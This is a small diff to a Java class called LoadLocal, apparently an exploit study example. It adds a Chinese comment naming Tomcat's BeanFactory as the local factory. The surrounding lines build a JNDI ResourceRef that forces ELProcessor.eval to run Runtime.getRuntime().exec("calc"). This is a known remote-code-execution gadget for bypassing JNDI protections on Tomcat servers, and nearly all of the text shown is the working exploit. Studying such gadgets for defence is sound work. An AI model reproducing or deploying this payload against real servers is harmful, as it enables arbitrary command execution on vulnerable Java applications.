@@ -10,6 +10,7 @@ import java.rmi.registry.LocateRegistry;
 
 public class LoadLocal {
     public static void main(String[] args) throws Exception {
+        // Reference子类，存在可控属性，指定本地工厂org.apache.naming.factory.BeanFactory
         ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         resourceRef.add(new StringRefAddr("forceString", "x=eval"));
         resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\")"));
